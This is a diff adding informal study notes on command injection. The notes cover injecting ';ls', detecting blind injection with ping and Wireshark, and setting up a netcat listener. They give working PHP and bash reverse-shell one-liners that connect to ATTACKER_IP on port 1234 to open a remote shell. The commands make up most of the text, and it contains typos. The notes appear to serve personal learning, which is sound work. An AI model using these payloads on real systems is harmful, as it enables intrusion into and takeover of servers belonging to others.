@@ -1,0 +1,33 @@
+;ls 
+
+blind command inject
+
+it does not output so we use wireshark ;ping something 
+if wireshark have response means it is blind cmd injection
+
+and tips
+if we found the website show smtg similar to tool we use it might vulnerable to command injection
+
+To make website inject using own linux terminal 
+
+1)nc -lvp (listening to any interface on port ) -p 1234
+-l → listen mode
+-v → verbose (show connections)
+-n → no DNS lookup (faster)
+
+2)just foofle php reverseshelll cmd eg.
+
+PHP one-liner:
+<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'"); ?>
+
+Or
+
+if you can directly run commands (RCE):
+bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1
+
+
+Replace ATTACKER_IP with your real attacking machine’s IP, same port 1234.
+
+3)reverse shello= opened 
+
+
